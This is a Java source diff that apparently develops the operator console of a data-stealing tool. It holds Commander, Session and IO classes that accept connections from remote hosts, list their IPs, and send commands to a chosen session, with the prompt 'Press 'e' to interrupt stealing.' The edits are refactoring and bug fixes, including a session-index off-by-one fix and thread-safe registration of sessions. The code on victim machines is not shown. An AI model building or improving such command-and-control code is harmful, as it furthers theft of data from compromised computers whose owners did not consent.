@@ -31,7 +31,6 @@ abstract class Cmd {
 class Commander {
 
 	private BufferedReader br;
-	private DataOutputStream dos;
 	private Thread commandThread;
 
 	private static class Singleton {
@@ -44,6 +43,12 @@ class Commander {
 
 	public Commander() {
 		br = new BufferedReader(new InputStreamReader(System.in));
+		
+	}
+
+	public void command(DataOutputStream dos) {
+
+		System.out.println("Press 'e' to interrupt stealing.\n");
 		commandThread = new Thread(() -> {
 			while (true) {
 				try {
@@ -55,13 +60,8 @@ class Commander {
 				}
 			}
 		});
-	}
-
-	public void command(DataOutputStream dos) {
-		this.dos = dos;
-
-		System.out.println("Press 'e' to interrupt stealing.\n");
 		commandThread.start();
+		
 		while (true) {
 			try {
 				String input = br.readLine();
@@ -74,7 +74,6 @@ class Commander {
 				break;
 			}
 		}
-
 		commandThread.interrupt();
 	}
 }
@@ -124,8 +123,11 @@ class Session implements Runnable {
 			dos = new DataOutputStream(sessionSocket.getOutputStream());
 			ois = new ObjectInputStream(sessionSocket.getInputStream());
 			ip = sessionSocket.getInetAddress().getHostAddress();
-			System.out.println("New Session connected : " + ip);
+			System.out.println("\nNew Session connected : " + ip);
 
+			synchronized (pRes.sessionList) {
+				pRes.sessionList.add(this);
+			}
 			return true;
 		} catch (Exception e) {
 			System.out.println("Failed to get stream.");
@@ -191,6 +193,8 @@ class IO {
 						break;
 					}
 					System.out.println();
+					System.out.println("No          IP");
+					System.out.println("---------------");
 					for (int i = 0; i < pRes.sessionList.size(); ++i)
 						System.out.println(i + 1 + "        " + pRes.sessionList.get(i).getIp());
 					break;
@@ -214,7 +218,7 @@ class IO {
 					System.out.println("There is no session " + sessionIdx);
 					continue;
 				}
-				Session session = pRes.sessionList.get(sessionIdx);
+				Session session = pRes.sessionList.get(sessionIdx - 1);
 				Commander.getInstance().command(session.getDos());
 			} else
 				invalidCommand();
